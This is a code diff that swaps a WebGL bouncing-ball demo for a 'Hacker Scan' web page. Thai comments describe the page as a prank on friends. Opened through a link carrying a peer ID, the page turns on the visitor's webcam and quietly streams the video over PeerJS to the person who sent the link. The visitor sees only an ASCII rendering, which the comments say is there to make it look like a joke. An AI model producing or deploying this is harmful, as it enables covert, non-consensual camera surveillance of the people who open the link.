@@ -1,189 +1,103 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>BALL MULTIPLIER 10M+ FPS FIX</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Hacker Scan - v.01</title>
     <style>
-        body { margin: 0; background: #000; color: #0f0; overflow: hidden; font-family: 'Courier New', monospace; }
-        canvas { display: block; width: 100vw; height: 100vh; }
-        #ui { position: absolute; top: 10px; left: 50%; transform: translateX(-50%);
-              background: rgba(0, 0, 0, 0.8); padding: 8px 15px; border-radius: 5px;
-              border: 1px solid #0f0; pointer-events: none; text-align: center; font-size: 14px; }
+        body { background: black; color: #fff; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        #ascii-display { font-size: 10px; line-height: 9px; white-space: pre; letter-spacing: 1px; color: #fff; font-weight: bold; }
+        .ui { position: absolute; bottom: 20px; color: #444; font-size: 12px; }
+        #status { color: #ff0000; margin-bottom: 10px; }
     </style>
 </head>
 <body>
-    <div id="ui">TOUCH TO START<br>BALLS: 0 | FPS: 0</div>
-    <canvas id="glCanvas"></canvas>
 
-<script>
-/**
- * ULTRA OPTIMIZED WEBGL ENGINE
- * Handles millions of particles using GPU Point Sprites
- */
-const canvas = document.getElementById('glCanvas');
-const ui = document.getElementById('ui');
-const gl = canvas.getContext('webgl', { antialias: false, preserveDrawingBuffer: false });
+    <div id="status">WAITING FOR TARGET...</div>
+    <pre id="ascii-display"></pre>
+    <div class="ui">ENCRYPTED STREAM - 24H GROUP MONITORING</div>
 
-if (!gl) alert("WebGL not supported");
-
-// --- Configuration ---
-let width, height;
-const circleRadius = 0.9; // Normalized -1 to 1
-const ballSize = 4.0;    // Pixel size
-const gravity = -0.005;
-const friction = 1.0;
-const MAX_PARTICLES = 10000000; // 10 Million
-
-// Data Storage (Typed Arrays for Speed)
-const posData = new Float32Array(MAX_PARTICLES * 2);
-const velData = new Float32Array(MAX_PARTICLES * 2);
-let particleCount = 0;
-
-// Shaders
-const vsSource = `
-    attribute vec2 a_position;
-    void main() {
-        gl_Position = vec4(a_position, 0.0, 1.0);
-        gl_PointSize = ${ballSize.toFixed(1)};
-    }
-`;
-const fsSource = `
-    precision mediump float;
-    void main() {
-        float d = distance(gl_PointCoord, vec2(0.5, 0.5));
-        if (d > 0.5) discard;
-        gl_FragColor = vec4(1.0, 0.2, 0.3, 1.0); // Red Ball
-    }
-`;
-
-function createShader(gl, type, source) {
-    const s = gl.createShader(type);
-    gl.shaderSource(s, source);
-    gl.compileShader(s);
-    return s;
-}
-
-const program = gl.createProgram();
-gl.attachShader(program, createShader(gl, gl.VERTEX_SHADER, vsSource));
-gl.attachShader(program, createShader(gl, gl.FRAGMENT_SHADER, fsSource));
-gl.linkProgram(program);
-gl.useProgram(program);
-
-const buffer = gl.createBuffer();
-const aPos = gl.getAttribLocation(program, "a_position");
-
-// --- Audio ---
-const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-function playBeep() {
-    if (audioCtx.state === 'suspended') return;
-    const osc = audioCtx.createOscillator();
-    const gain = audioCtx.createGain();
-    osc.connect(gain); gain.connect(audioCtx.destination);
-    osc.frequency.value = 800;
-    gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
-    gain.gain.linearRampToValueAtTime(0, audioCtx.currentTime + 0.02);
-    osc.start(); osc.stop(audioCtx.currentTime + 0.02);
-}
-
-function spawnBall(x, y, vx, vy) {
-    if (particleCount >= MAX_PARTICLES) return;
-    const idx = particleCount * 2;
-    posData[idx] = x;
-    posData[idx + 1] = y;
-    velData[idx] = vx;
-    velData[idx + 1] = vy;
-    particleCount++;
-}
-
-// Initial Ball
-spawnBall(0, 0.5, 0.02, 0);
-
-function resize() {
-    width = window.innerWidth;
-    height = window.innerHeight;
-    canvas.width = width;
-    canvas.height = height;
-    gl.viewport(0, 0, width, height);
-}
-window.onresize = resize;
-resize();
-
-let lastT = 0;
-function loop(t) {
-    const dt = t - lastT;
-    lastT = t;
-
-    const aspect = width / height;
-    const spawnQueue = [];
-
-    // Physics Step (CPU Side - Fast enough for a few hundred thousand, 
-    // but 10M will eventually need GPU Compute/GPGPU)
-    for (let i = 0; i < particleCount; i++) {
-        let idx = i * 2;
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    
+    <script>
+        const asciiDisplay = document.getElementById('ascii-display');
+        const status = document.getElementById('status');
+        const CHAR_SIZE = 12;
+        const chars = "@#8&WMHB*pxoI;:. ";
         
-        // Apply Physics
-        velData[idx + 1] += gravity * (dt / 16); 
-        posData[idx] += velData[idx];
-        posData[idx + 1] += velData[idx + 1];
+        // --- ส่วนของ PeerJS (ระบบส่งภาพ) ---
+        // ถ้าคุณเป็นคนดู (Host) ให้ใส่ ID ว่า 'master-hacker' 
+        // ถ้าเพื่อนเปิด ลิงก์จะทำการโทรหา 'master-hacker' อัตโนมัติ
+        const peer = new Peer(); 
 
-        // Collision Logic (Circular Boundary)
-        let dx = posData[idx];
-        let dy = posData[idx + 1] * aspect; // Adjust for aspect ratio
-        let dist = Math.sqrt(dx*dx + dy*dy);
-
-        if (dist > circleRadius) {
-            if (particleCount < 5000) playBeep(); // Limit sound to prevent lag
-
-            // Reflect
-            let nx = dx / dist;
-            let ny = dy / dist;
+        peer.on('open', (id) => {
+            console.log('My ID is: ' + id);
+            // ถ้าอยากแกล้งเพื่อน ให้ส่งลิงก์ที่มีพารามิเตอร์ไป เช่น ?target=master-hacker
+            const urlParams = new URLSearchParams(window.location.search);
+            const targetId = urlParams.get('call');
             
-            // Re-normalize velocity for reflection
-            let v_idx_x = velData[idx];
-            let v_idx_y = velData[idx + 1] * aspect;
-            let dot = v_idx_x * nx + v_idx_y * ny;
+            if (targetId) {
+                startCam(targetId); // ถ้ามี ID เป้าหมาย ให้เริ่มส่งกล้องทันที
+            } else {
+                status.innerText = "YOUR ID: " + id + " (ส่ง ID นี้ให้เพื่อน หรือเติม ?call=[ID] ในลิงก์)";
+            }
+        });
 
-            velData[idx] = (v_idx_x - 2 * dot * nx);
-            velData[idx + 1] = (v_idx_y - 2 * dot * ny) / aspect;
-
-            // Multiply
-            if (particleCount < MAX_PARTICLES) {
-                spawnQueue.push([
-                    posData[idx], posData[idx+1], 
-                    velData[idx] + (Math.random()-0.5)*0.01, 
-                    velData[idx+1] + (Math.random()-0.5)*0.01
-                ]);
+        async function startCam(targetId) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                status.innerText = "TARGET IDENTIFIED - STREAMING...";
+                
+                // ส่งวิดีโอไปให้เครื่อง Master
+                peer.call(targetId, stream);
+                
+                // แสดงผล ASCII บนจอเพื่อนด้วย จะได้ดูเนียนว่าเป็นการแกล้ง
+                renderAscii(stream);
+            } catch (err) {
+                status.innerText = "ERROR: ACCESS DENIED";
             }
         }
-    }
 
-    // Add new particles
-    for (let s of spawnQueue) {
-        if (particleCount < MAX_PARTICLES) spawnBall(s[0], s[1], s[2], s[3]);
-    }
+        // รับสาย (สำหรับเครื่องที่จะใช้ดูเพื่อน)
+        peer.on('call', (call) => {
+            call.answer(); // รับสายอัตโนมัติ
+            call.on('stream', (remoteStream) => {
+                renderAscii(remoteStream); // แสดงภาพเพื่อนที่ส่งมาเป็น ASCII
+                status.innerText = "RECEIVING LIVE FEED...";
+            });
+        });
 
-    // Render Step
-    gl.clear(gl.COLOR_BUFFER_BIT);
-    
-    // Draw Background Circle (Approx with points or lines)
-    // For speed, we just draw the particles
-    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-    gl.bufferData(gl.ARRAY_BUFFER, posData.subarray(0, particleCount * 2), gl.STREAM_DRAW);
-    gl.enableVertexAttribArray(aPos);
-    gl.vertexAttribPointer(aPos, 2, gl.FLOAT, false, 0, 0);
-    gl.drawArrays(gl.POINTS, 0, particleCount);
+        // --- ส่วนของการแปลง ASCII (ยกมาจากที่เราทำกัน) ---
+        function renderAscii(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
 
-    ui.innerHTML = `BALLS: ${particleCount.toLocaleString()}<br>FPS: ${Math.round(1000/dt)}`;
-    requestAnimationFrame(loop);
-}
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
 
-window.onclick = () => {
-    audioCtx.resume();
-    if (particleCount === 0) loop(0);
-};
+            video.onloadedmetadata = () => {
+                const w = Math.floor(video.videoWidth / CHAR_SIZE);
+                const h = Math.floor(video.videoHeight / CHAR_SIZE);
+                canvas.width = w; canvas.height = h;
 
-// Start
-loop(0);
-</script>
+                function draw() {
+                    ctx.drawImage(video, 0, 0, w, h);
+                    const pixels = ctx.getImageData(0, 0, w, h).data;
+                    let frame = "";
+                    for (let y = 0; y < h; y++) {
+                        for (let x = 0; x < w; x++) {
+                            const i = (y * w + x) * 4;
+                            const brightness = (pixels[i] + pixels[i+1] + pixels[i+2]) / 3;
+                            const charIdx = Math.floor((brightness / 256) * chars.length);
+                            frame += chars[chars.length - 1 - charIdx];
+                        }
+                        frame += "\\n";
+                    }
+                    asciiDisplay.innerText = frame;
+                    requestAnimationFrame(draw);
+                }
+                draw();
+            };
+        }
+    </script>
 </body>
 </html>
